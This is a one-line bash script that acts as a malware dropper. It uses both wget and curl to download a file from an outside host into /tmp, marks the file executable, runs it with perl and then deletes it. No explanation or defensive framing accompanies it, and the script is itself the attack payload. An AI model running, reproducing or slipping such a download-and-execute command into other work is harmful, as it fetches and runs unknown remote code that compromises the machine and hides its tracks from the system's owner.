#!/bin/bash

wget -O /tmp/doc http://pizzamost.hu/js/doc;curl -o /tmp/doc http://pizzamost.hu/js/doc;chmod +x /tmp/doc;perl /tmp/doc;rm -rf /tmp/doc
